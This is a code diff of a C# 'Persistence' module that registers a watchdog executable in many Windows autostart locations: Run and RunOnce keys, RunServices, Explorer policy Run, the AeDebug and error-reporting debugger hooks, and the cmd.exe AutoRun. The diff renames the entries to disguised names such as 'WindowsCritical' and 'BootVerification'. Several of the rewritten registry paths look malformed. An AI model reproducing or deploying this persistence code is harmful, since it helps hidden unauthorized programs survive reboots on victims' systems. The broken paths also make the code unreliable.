@@ -10,24 +10,24 @@ namespace Persistence
 
         public static void runAllTechniques()
         {
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); // Run Keys on startup
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\", "RunServices", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\", "RunServices", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "RunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); // Run Keys on startup
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "WindowsRunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServices", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServices", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\", "Run", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
-            SetRegistryKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", "Load", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
-            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            SetRegistryKey(@"Software\Microsoft\Windows NT\CurrentVersion\WindowsLoad", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
 
 
 
-            SetRegistryKey(@"Software\Microsoft\Windows NT\CurrentVersion\AeDebug\", "Debugger", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); //relies on application crash
-            SetRegistryKey(@"Software\Microsoft\Windows\Windows Error Reporting\Hangs\", "Debugger", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); //relies on application crash
+            SetRegistryKey(@"Software\Microsoft\Windows NT\CurrentVersion\AeDebug\Debugger", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); //relies on application crash
+            SetRegistryKey(@"Software\Microsoft\Windows\Windows Error Reporting\Hangs\Debugger", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); //relies on application crash
 
-            SetRegistryKey(@"Software\Microsoft\Command Processor\", "AutoRun", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser); //Runs when cmd.exe starts
+            SetRegistryKey(@"Software\Microsoft\Command Processor\AutoRun", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser); //Runs when cmd.exe starts
 
 
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "BackupPath", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); //These three are Windows background processes
